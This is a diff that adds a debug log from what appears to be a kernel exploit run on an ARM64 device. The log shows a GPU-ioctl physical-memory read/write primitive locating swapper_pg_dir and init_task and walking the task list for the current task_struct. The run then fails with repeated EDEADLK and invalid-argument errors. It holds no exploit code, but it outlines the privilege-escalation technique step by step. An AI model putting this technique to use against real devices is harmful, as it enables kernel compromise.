@@ -1,0 +1,65 @@
+Current process PID: 14056
+Using phyaddr: 0x96a7d0000
+found it: virt addr = 0x73dc265000, phyaddr = 0x96a7d0000
+read output: 149a7fff
+kernel entry = aa6a0000
+target_read_physical_address = aa68b010
+CP_MEMCPY read for swapper_pg_dir successful.
+second read sentinel: 41414141
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: 0
+second read value: aa690003
+found CHEESE_SWAPPER_PG_DIR_OFF=0x2694000
+Found init_task_phys: 0xaa9abe00
+Found swapper_pg_dir_phys: 0xaa694000
+get_curr_task_struct: Called with cheese: 0x7fee4bda10, init_task_phys: 0xaa9abe00
+Starting task list backward traversal from init_task_phys: 0xaa9abe00
+get_curr_task_struct: Processing task at phys addr: 0xaa9abe00 (iteration 0)
+gpu_command ioctl err: Resource deadlock would occur (ctx=19 ts=0)
+DoWrite: EDEADLK on ctx=19, recreating context
+ctx_recreate: ctx 19 -> 13 (EDEADLK self-heal)
+gpu_command ioctl err: Invalid argument (ctx=19 ts=0)
+DoWrite submit FAILED: Invalid argument (write=0 phy=96a7d0000 off=3cc count=1)
+R64 fail@aa9ac3c8: DoWrite(high)
+gpu_command ioctl err: Invalid argument (ctx=19 ts=0)
+DoWrite submit FAILED: Invalid argument (write=0 phy=96a7d0000 off=3c8 count=1)
+R64 fail@aa9ac3c8: DoWrite(low)
+gpu_command ioctl err: Invalid argument (ctx=19 ts=0)
+DoWrite submit FAILED: Invalid argument (write=0 phy=96a7d0000 off=3c8 count=1)
+R64 fail@aa9ac3c8: DoWrite(low)
+gpu_command ioctl err: Invalid argument (ctx=19 ts=0)
+DoWrite submit FAILED: Invalid argument (write=0 phy=96a7d0000 off=3c8 count=1)
+R64 fail@aa9ac3c8: DoWrite(low)
+gpu_command ioctl err: Invalid argument (ctx=19 ts=0)
+DoWrite submit FAILED: Invalid argument (write=0 phy=96a7d0000 off=3c8 count=1)
+R64 fail@aa9ac3c8: DoWrite(low)
+Could not read PID for task at 0xaa9abe00
+get_curr_task_struct: Reading prev task pointer from: 0xaa9ac2d0
+gpu_command ioctl err: Invalid argument (ctx=19 ts=0)
+DoWrite submit FAILED: Invalid argument (write=0 phy=96a7d0000 off=2d0 count=1)
+R64 fail@aa9ac2d0: DoWrite(low)
+gpu_command ioctl err: Invalid argument (ctx=19 ts=0)
+DoWrite submit FAILED: Invalid argument (write=0 phy=96a7d0000 off=2d0 count=1)
+R64 fail@aa9ac2d0: DoWrite(low)
+gpu_command ioctl err: Invalid argument (ctx=19 ts=0)
+DoWrite submit FAILED: Invalid argument (write=0 phy=96a7d0000 off=2d0 count=1)
+R64 fail@aa9ac2d0: DoWrite(low)
+gpu_command ioctl err: Invalid argument (ctx=19 ts=0)
+DoWrite submit FAILED: Invalid argument (write=0 phy=96a7d0000 off=2d0 count=1)
+R64 fail@aa9ac2d0: DoWrite(low)
+gpu_command ioctl err: Invalid argument (ctx=19 ts=0)
+DoWrite submit FAILED: Invalid argument (write=0 phy=96a7d0000 off=2d0 count=1)
+R64 fail@aa9ac2d0: DoWrite(low)
+Error reading prev task pointer
+get_curr_task_struct: Failed to find current task after 0 iterations
+Failed to get current task_struct
+stabilize_rw failed
